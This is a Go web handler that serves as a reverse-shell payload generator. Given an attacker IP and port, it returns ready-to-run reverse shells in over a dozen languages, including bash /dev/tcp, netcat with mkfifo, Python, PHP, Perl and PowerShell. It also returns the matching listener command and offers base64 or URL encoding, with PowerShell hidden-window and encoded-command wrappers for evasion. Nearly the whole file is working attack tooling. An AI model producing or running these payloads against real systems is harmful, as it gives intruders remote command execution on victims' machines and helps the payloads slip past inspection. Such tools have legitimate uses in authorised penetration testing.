package handlers

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"net/url"
	"unicode/utf16"

	"github.com/gin-gonic/gin"
)

type revshellResponse struct {
	Payload  string `json:"payload"`
	Listener string `json:"listener"`
	Lang     string `json:"lang"`
	OS       string `json:"os"` // linux | windows | cross
}

// GetRevShell génère un reverse shell payload stateless.
// GET /api/revshell?ip=<lhost>&port=<lport>&lang=<lang>&encode=<none|base64|url>
func GetRevShell(c *gin.Context) {
	ip     := c.Query("ip")
	port   := c.DefaultQuery("port", "4444")
	lang   := c.DefaultQuery("lang", "bash")
	encode := c.DefaultQuery("encode", "none")

	if ip == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "paramètre 'ip' requis"})
		return
	}

	raw, listener, osTag := revshellBuild(lang, ip, port)
	if raw == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "langage non supporté : " + lang})
		return
	}

	c.JSON(http.StatusOK, revshellResponse{
		Payload:  revshellEncode(encode, lang, raw),
		Listener: listener,
		Lang:     lang,
		OS:       osTag,
	})
}

// revshellBuild retourne (rawCmd, listenerCmd, osTag).
// Pour "powershell", rawCmd est le code PS sans le wrapper powershell.exe,
// afin que revshellEncode puisse appliquer -EncodedCommand ou -nop -w hidden.
func revshellBuild(lang, ip, port string) (string, string, string) {
	nc := fmt.Sprintf("nc -lvnp %s", port)

	switch lang {
	case "bash":
		return fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", ip, port), nc, "linux"

	case "sh":
		return fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %s >/tmp/f", ip, port), nc, "linux"

	case "python3":
		return fmt.Sprintf(
			`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'`,
			ip, port,
		), nc, "linux"

	case "python2":
		return fmt.Sprintf(
			`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'`,
			ip, port,
		), nc, "linux"

	case "php":
		return fmt.Sprintf(
			`php -r '$sock=fsockopen("%s",%s);$proc=proc_open("sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`,
			ip, port,
		), nc, "linux"

	case "perl":
		return fmt.Sprintf(
			`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");}'`,
			ip, port,
		), nc, "linux"

	case "ruby":
		return fmt.Sprintf(
			`ruby -rsocket -e'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'`,
			ip, port,
		), nc, "linux"

	case "powershell":
		ps := fmt.Sprintf(
			`$client=New-Object System.Net.Sockets.TCPClient('%s',%s);`+
				`$stream=$client.GetStream();`+
				`[byte[]]$bytes=0..65535|%%{0};`+
				`while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){`+
				`$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);`+
				`$sendback=(iex $data 2>&1|Out-String);`+
				`$sendback2=$sendback+'PS '+(pwd).Path+'> ';`+
				`$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);`+
				`$stream.Write($sendbyte,0,$sendbyte.Length);`+
				`$stream.Flush()};$client.Close()`,
			ip, port,
		)
		return ps, nc, "windows"

	case "nc_traditional":
		return fmt.Sprintf("nc -e /bin/bash %s %s", ip, port), nc, "linux"

	case "nc_openbsd":
		return fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc %s %s >/tmp/f", ip, port), nc, "linux"

	case "java":
		code := fmt.Sprintf(
			"public class Exploit {\n"+
				"    public static void main(String[] args) throws Exception {\n"+
				"        String host = \"%s\";\n"+
				"        int port = %s;\n"+
				"        Process p = Runtime.getRuntime().exec(\"sh\");\n"+
				"        java.net.Socket s = new java.net.Socket(host, port);\n"+
				"        java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\n"+
				"        java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();\n"+
				"        while (!s.isClosed()) {\n"+
				"            while (pi.available()>0) so.write(pi.read());\n"+
				"            while (pe.available()>0) so.write(pe.read());\n"+
				"            while (si.available()>0) po.write(si.read());\n"+
				"            so.flush(); po.flush(); Thread.sleep(50);\n"+
				"            try { p.exitValue(); break; } catch (Exception e) {}\n"+
				"        }\n"+
				"    }\n"+
				"}",
			ip, port,
		)
		return code, nc, "cross"

	case "golang":
		code := fmt.Sprintf(
			"package main\n\nimport (\n\t\"net\"\n\t\"os/exec\"\n)\n\n"+
				"func main() {\n"+
				"\tc, _ := net.Dial(\"tcp\", \"%s:%s\")\n"+
				"\tcmd := exec.Command(\"sh\")\n"+
				"\tcmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c\n"+
				"\tcmd.Run()\n"+
				"}",
			ip, port,
		)
		return code, nc, "cross"

	case "awk":
		return fmt.Sprintf(
			`awk 'BEGIN {s="/inet/tcp/0/%s/%s";while(42){do{printf "sh> "|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")close(s)}}' /dev/stdin`,
			ip, port,
		), nc, "linux"

	case "lua":
		return fmt.Sprintf(
			`lua5.1 -e 'local s=require("socket");local t=s.tcp();t:connect("%s",%s);while true do local r,e=t:receive();if e then break end;local f=io.popen(r,"r");t:send(f:read("*a"));f:close() end'`,
			ip, port,
		), nc, "linux"

	case "nodejs":
		return fmt.Sprintf(
			`node -e '(function(){var n=require("net"),cp=require("child_process"),sh=cp.spawn("sh",[]);var c=new n.Socket();c.connect(%s,"%s",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)})})();'`,
			port, ip,
		), nc, "cross"

	case "socat":
		listener := fmt.Sprintf("socat file:`tty`,raw,echo=0 tcp-listen:%s,reuseaddr", port)
		return fmt.Sprintf("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s", ip, port), listener, "linux"
	}

	return "", "", ""
}

// revshellEncode applique l'encodage demandé au raw payload.
// Pour "powershell", raw est le code PS sans wrapper — le wrapper est ajouté ici.
func revshellEncode(encode, lang, raw string) string {
	switch encode {
	case "base64":
		if lang == "powershell" {
			// -EncodedCommand attend du UTF-16LE encodé en base64
			u16 := utf16.Encode([]rune(raw))
			b := make([]byte, len(u16)*2)
			for i, r := range u16 {
				b[i*2] = byte(r)
				b[i*2+1] = byte(r >> 8)
			}
			return "powershell -EncodedCommand " + base64.StdEncoding.EncodeToString(b)
		}
		enc := base64.StdEncoding.EncodeToString([]byte(raw))
		if runner := revshellRunner(lang); runner != "" {
			return fmt.Sprintf("echo '%s' | base64 -d | %s", enc, runner)
		}
		// java/golang : code source, décodage seul
		return fmt.Sprintf("echo '%s' | base64 -d", enc)

	case "url":
		full := raw
		if lang == "powershell" {
			full = fmt.Sprintf(`powershell -nop -w hidden -c "%s"`, raw)
		}
		return url.QueryEscape(full)

	default: // "none"
		if lang == "powershell" {
			return fmt.Sprintf(`powershell -nop -w hidden -c "%s"`, raw)
		}
		return raw
	}
}

// revshellRunner retourne l'interpréteur à utiliser pour le wrapping base64.
// Retourne "" pour java/golang (code source, pas exécutable directement).
func revshellRunner(lang string) string {
	switch lang {
	case "bash", "sh", "nc_traditional", "nc_openbsd", "socat", "awk":
		return "bash"
	case "python3":
		return "python3"
	case "python2":
		return "python2"
	case "php":
		return "php"
	case "perl":
		return "perl"
	case "ruby":
		return "ruby"
	case "lua":
		return "lua5.1"
	case "nodejs":
		return "node"
	default:
		return ""
	}
}
